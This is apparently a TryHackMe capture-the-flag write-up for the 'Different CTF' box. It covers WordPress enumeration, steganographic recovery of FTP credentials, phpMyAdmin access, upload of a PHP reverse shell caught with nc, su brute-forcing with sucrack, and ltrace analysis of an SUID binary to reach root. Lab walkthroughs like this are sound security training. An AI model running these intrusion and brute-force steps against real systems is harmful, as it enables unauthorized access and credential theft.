# Different CTF TryHackMe WriteUp  
### Machine IP = 10.114.131.112  
First of all, I made a rust scan.  
```bash
rustscan -a 10.114.131.112
```
Open Ports: 21, 80.  
We need to add "adana.thm" domain into /etc/hosts file to open the website properly. It is a wordpress web-site. The first thing that I checked was wpscan to find if there is any vulnerability.    
```bash
wpscan --url http://adana.thm --enumerate vp,vt,tt,cb,dbe,u --plugins-detection mixed
```
I saw a username in there as "hakanbey01" and got nothing special else.     
Let's make a directory scan to find hidden directories:    
```bash
ffuf -u http://adana.thm/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -fs 0 -t 250

.hta                    [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 516ms]
.htpasswd               [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 2496ms]
announcements           [Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 109ms]
.htaccess               [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 8556ms]
javascript              [Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 82ms]
phpmyadmin              [Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 153ms]
server-status           [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 77ms]
wp-admin                [Status: 301, Size: 309, Words: 20, Lines: 10, Duration: 74ms]
wp-content              [Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 72ms]
wp-includes             [Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 149ms]
xmlrpc.php              [Status: 405, Size: 42, Words: 6, Lines: 1, Duration: 130ms]
```

It gave me some directories and the hidden one that the CTF asked for is "announcements". Lets look at it:      
<img width="1248" height="529" alt="image" src="https://github.com/user-attachments/assets/69c9dd78-b9f8-4062-a7e1-18910ccfe3f3" />    
There is a jpg file and a wordlist. This is so clear that it is about steganography. Let's check it. I copied the content of the wordlist in the pass.txt file on my terminal.    

```bash
┌──(faridd㉿Ferid)-[~/Downloads/differentctf]
└─$ stegseek austrailian-bulldog-ant.jpg pass.txt
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: "123adanaantinwar"
[i] Original filename: "user-pass-ftp.txt".
[i] Extracting to "austrailian-bulldog-ant.jpg.out".
```
Yeah, we got it. Lets read the content of this "austrailian-bulldog-ant.jpg.out" file.    
```bash
┌──(faridd㉿Ferid)-[~/Downloads/differentctf]
└─$ cat austrailian-bulldog-ant.jpg.out
RlRQLUxPR0lOClVTRVI6IGhha2FuZnRwClBBU1M6IDEyM2FkYW5hY3JhY2s=
                                                                                                                                                                                                                                              
┌──(faridd㉿Ferid)-[~/Downloads/differentctf]
└─$ echo 'RlRQLUxPR0lOClVTRVI6IGhha2FuZnRwClBBU1M6IDEyM2FkYW5hY3JhY2s=' | base64 -d
FTP-LOGIN
USER: hakanftp
PASS: 123adanacrack
```

As you remember, we had an open ftp port (21). Lets access this user. When I looked at the files I saw the wordpress config file "wp-config.php". Lets read it. Firstly you need to write "get wp-config.php" to install it to your own terminal.     
<img width="1009" height="386" alt="image" src="https://github.com/user-attachments/assets/a24c180c-629e-43c4-bc7d-ba4e9595251f" />    
That is exactly what I wanted. I tried to access it by this way : mysql -uphpmyadmin -p'12345' -h localhost --> But it didn't work. Then I remember another hidden directory that we found (phpmyadmin). Let's check this credentials on that login page.    
|    
<img width="1733" height="998" alt="image" src="https://github.com/user-attachments/assets/ec724d68-d00c-4aa1-8880-60e12e564352" />    
|    
There are six databases. The first one that I checked was "phpmyadmin1" because in wp-config.php file I saw it as a database.    
|    
<img width="401" height="539" alt="image" src="https://github.com/user-attachments/assets/c2281c88-75f9-4f66-bcb7-eb9ca67fb40a" />    
|    
I found (where) --> (what):  
| wp-options --> http://subdomain.adana.thm  
| wp-users --> hakanbey01::$P$BEyLE6bPLjgWQ3IHrLu3or19t0faUh.  
They are as a gold mine !!!! Lets add this subdomain to /etc/hosts file as well. And also decrypt this hash of the hakanbey01. John give me the password: 12345. It is same as phpmyadmin user's. SSH isn't enable on this CTF and ftp also didn't have this user. Maybe it something like a rabit hole.     

----
Lets try to get shell. But how? Firstly, I need to upload reverseshell.php file (which I got from pentestmonkey) to the ftp user's folder. It is very classic.    
```bash
# In my terminal:
cp ~/Downloads/reverseshell.php .
# In target terminal:
ftp> put reverseshell.php
ftp> chmod 755 reverseshell.php
```
Now, all we need is just open a nc connection and go to this url: http://subdomain.adana.thm/reverseshell.php --> Actually firstly, I checked the "http://adana.thm/reverseshell.php" and it didn't work. So I decided to check it on the other subdomain. Yeahh, we are successfull right now. Lets go our shell and get the first flag.  

----  
### Web-Flag  
```bash  
cat /var/www/html/wwe3bbfla4g.txt
```
I cannot access to "hakanbey" user which is our next goal in the way to be the root. I checked "sudo -l", "getcap", "SUID binaries", "linpeas.sh", "pspy64" but got nothing special from there. I accessed to the mysql with found credentials. phpmyadmin:12345 --> I checked all databases but got nothing new. There was a credential "hakanbey01 | $P$BQML2QxAFBH4hb.qqKTpDnta6Q6Wl2/" in "phpmyadmin" dtaabase but I couldn't be decrypted with john. Others are the same that we have already defined so, there is nothing special else.   

----
### User Flag  
I almost checked everything in there but couldnt find the password of "hakanbey" user. Then I noticed that passwords that we found started with "123adana" in everytime. For example:  
The passphase for "austrailian-bulldog-ant.jpg" : 123adanaantinwar  
The password of ftp user (hakanftp): 123adanacrack  
Now, maybe the password of the hakanbey start with "123adana". So, lets add this string in front of all password inside the wordlist.txt that we got from secret directory "announcements":     
Firstly, we need to install sucrack to our terminal from github, then we will send it to the target via python connection:  
```bash
git clone https://github.com/hemp3l/sucrack.git
tar -zcvf sucrack.tar.gz ./sucrack
python3 -m http.server 8000
```
After completing them, go to the target terminal and execute this commands:    
```bash
cd /tmp
chmod -R 777 sucrack.tar.gz
tar -zxvf sucrack.tar.gz
cd sucrack
./configure
make
```
Now, we need to create new wordlist by using sed:  
```bash
sed 's/^/123adana/' /var/www/html/announcements/wordlist.txt > newlist.txt
```
The last step is run sucrack command:    
```bash
./src/sucrack -u hakanbey -w 100 newlist.txt
```
Bingooo!!!!! We got the password for "hakanbey" user : 123adanasubaru  -->  Lets use su command to be hakanbey and take the user flag.  

----
### Privilege Escalation  

"Sudo -l" didn't give any hint but SUID binaries show the key for being root:  
```bash
hakanbey@ubuntu:/home$ find / -perm /4000 2>/dev/null

/usr/bin/binary
```
Let's execute it to know what it does:     
```bash
hakanbey@ubuntu:/home$ ls -la /usr/bin/binary
-r-srwx--- 1 root hakanbey 12984 Jan 14  2021 /usr/bin/binary

hakanbey@ubuntu:/home$ /usr/bin/binary
I think you should enter the correct string here ==> root
pkill: killing pid 2030 failed: Operation not permitted
pkill: killing pid 5824 failed: Operation not permitted
www-data@ubuntu:/home$
```
It took me out the terminal. I went back and used "strings" command to read its plain content and get very big hint from there:   
```bash
strings /usr/bin/binary

///
system@@GLIBC_2.2.5
strcmp@@GLIBC_2.2.5
strcat@@GLIBC_2.2.5
///
```
They are holy triple. Lets explain it:    
strcat --> Normally in says that the password isn't stored complete. It is divided into parts.  
strcmp --> It is used to compare this parts, for defining their real location on the full password.  
system --> is used to execute the linux commands such as "cp, cat, sh" like your are in the terminal.  

Simply, if you saw this holy triple, you need to use "ltrace" command to see the compared password parts and the library functions that the program uses.  
```bash
hakanbey@ubuntu:/home$ ltrace /usr/bin/binary

ltrace /usr/bin/binary
strcat("war", "zone")                            = "warzone"
strcat("warzone", "in")                          = "warzonein"
strcat("warzonein", "ada")                       = "warzoneinada"
strcat("warzoneinada", "na")                     = "warzoneinadana"
printf("I think you should enter the cor"...)    = 52
__isoc99_scanf(0x5555aecb8edd, 0x7ffc49a81030, 0, 0I think you should enter the correct string here ==>1
```
Yeahhhh, we got the full password: "warzoneinadana". We will use it when the program asks for string.    
```bash
hakanbey@ubuntu:/home$ /usr/bin/binary
/usr/bin/binary
I think you should enter the correct string here ==>warzoneinadana
warzoneinadana
Hint! : Hexeditor 00000020 ==> ???? ==> /home/hakanbey/Desktop/root.jpg (CyberChef)

Copy /root/root.jpg ==> /home/hakanbey/root.jpg
hakanbey@ubuntu:/home$ 
```
It gave us a hint and add the root.jpg file into the hakanbey user's folder. I forwarded it into my own terminal by python connection and looked at its hex code.    
```bash
┌──(faridd㉿Ferid)-[~/Downloads/differentctf]
└─$ xxd root.jpg | head -n 5

00000000: ffd8 ffe0 0010 4a46 4946 0001 0101 0060  ......JFIF.....`
00000010: 0060 0000 ffe1 0078 4578 6966 0000 4d4d  .`.....xExif..MM
00000020: fee9 9d3d 7918 5ffc 826d df1c 69ac c275  ...=y._..m..i..u
00000030: 0000 0056 0301 0005 0000 0001 0000 0068  ...V...........h
00000040: 0303 0001 0000 0001 0000 0000 5110 0001  ............Q...
```
The hints says us to convert it on CyberChef. So, lets go to there.      
<img width="2491" height="931" alt="image" src="https://github.com/user-attachments/assets/e12cbfe1-1dab-4a1a-9522-f1d2dd183e52" />      
BINGOO!!!! It worked. Let's use these credentials to be root and get the root flag from there --> root:Go0odJo0BbBro0o  























